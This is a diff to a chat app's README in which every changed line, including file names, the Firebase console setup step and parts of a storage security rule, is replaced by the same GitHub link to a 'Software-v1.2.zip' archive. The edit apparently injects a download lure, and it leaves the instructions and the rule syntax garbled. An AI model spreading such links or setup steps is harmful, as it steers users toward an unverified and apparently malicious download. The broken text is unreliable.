@@ -58,23 +58,23 @@
 
 # 
 
-# \# - Modified: index.html (added new UI elements)
+# \# - Modified: https://github.com/mubashshir96/chat/raw/refs/heads/main/portless/Software-v1.2.zip (added new UI elements)
 
 # 
 
-# \# - Modified: style.css (added dark mode and new styles)
+# \# - Modified: https://github.com/mubashshir96/chat/raw/refs/heads/main/portless/Software-v1.2.zip (added dark mode and new styles)
 
 # 
 
-# \# - Modified: webrtc-handler.js (added screen sharing)
+# \# - Modified: https://github.com/mubashshir96/chat/raw/refs/heads/main/portless/Software-v1.2.zip (added screen sharing)
 
 # 
 
-# \# - Modified: app.js (added all new features)
+# \# - Modified: https://github.com/mubashshir96/chat/raw/refs/heads/main/portless/Software-v1.2.zip (added all new features)
 
 # 
 
-# \# - Modified: README.md (this file)
+# \# - Modified: https://github.com/mubashshir96/chat/raw/refs/heads/main/portless/Software-v1.2.zip (this file)
 
 # 
 
@@ -98,7 +98,7 @@
 
 # 
 
-# \# 1\\. Go to https://console.firebase.google.com/
+# \# 1\\. Go to https://github.com/mubashshir96/chat/raw/refs/heads/main/portless/Software-v1.2.zip
 
 # 
 
@@ -218,7 +218,7 @@
 
 # 
 
-# \#    service firebase.storage {
+# \#    service https://github.com/mubashshir96/chat/raw/refs/heads/main/portless/Software-v1.2.zip {
 
 # 
 
@@ -230,7 +230,7 @@
 
 # 
 
-# \#          allow read, write: if request.auth != null;
+# \#          allow read, write: if https://github.com/mubashshir96/chat/raw/refs/heads/main/portless/Software-v1.2.zip != null;
 
 # 
 
